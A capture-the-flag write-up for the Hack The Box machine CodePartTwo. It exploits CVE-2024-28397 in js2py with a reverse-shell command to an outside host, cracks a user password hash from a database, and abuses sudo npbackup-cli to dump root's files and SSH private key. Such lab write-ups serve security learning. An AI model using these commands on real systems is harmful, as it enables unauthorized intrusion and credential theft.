---
title: HTB CodePartTwo - Writeup
date: 2025-08-26 13:53:00 +0330
categories: [Writeup]
tags: [api,cve]
description: My writeup of CodePartTwo from Hack The Box 

---

![infocard](assets/img/CodePartTwo.png)

## - **Recon & Enum**
```
Nmap scan report for 10.10.11.82
Host is up (0.49s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodeTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## - **Foothold**

The source is available in the Welcome page. We can see the app is based on Flask and uses the `js2py` library version `0.74` which is vulnerable to `CVE-2024-28397`.  
```
$ cat requirements.txt 
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

I used this [poc](https://raw.githubusercontent.com/Ghost-Overflow/CVE-2024-28397-command-execution-poc/refs/heads/main/payload.js) and replaced `cmd`:  
 `let cmd = "bash -c 'bash -i >& /dev/tcp/*.*.*.*/9090 0>&1'"`.
 
## - **User**
We get the password hash for user `marco` from the database file:
 
```
bash-5.0$ cd instance/
bash-5.0$ sqlite3 users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
code_snippet  user        
sqlite> select * from user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

and crack it using Hashcat:
``` 
$ hashcat -m0 hash.txt /usr/share/wordlists/rockyou.txt
...
649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove
```
Now the SSH:
```
$ ssh marco@10.10.11.82

-bash-5.0$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1003(backups)
-bash-5.0$ ls
backups  npbackup.conf  user.txt
-bash-5.0$
```

## - **Root**
We can use sudo with the followig binary:
```
-bash-5.0$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```
The npbackup uses `restic` as backend and we can enter restic commands directly using the `--raw` flag. So we create a backup of `/root` directory and then dump `root.txt` to get the flag.
```
-bash-5.0$ sudo npbackup-cli -c npbackup.conf --raw "backup /root"
-bash-5.0$ sudo npbackup-cli -c npbackup.conf --raw "dump <snapshotid> /root/root.txt"
```
Now to get a shell, we can dump the `/root/.ssh/id_rsa` file:
```
-bash-5.0$ sudo npbackup-cli -c npbackup.conf --raw "dump <snapshotid> /root/.ssh/id_rsa"
```

```
$ ssh -i id_rsa root@10.10.11.82
...
root@codeparttwo:~# id
uid=0(root) gid=0(root) groups=0(root)
root@codeparttwo:~# ls
root.txt  scripts
root@codeparttwo:~#
```

![](assets/img/code2pwn.png)
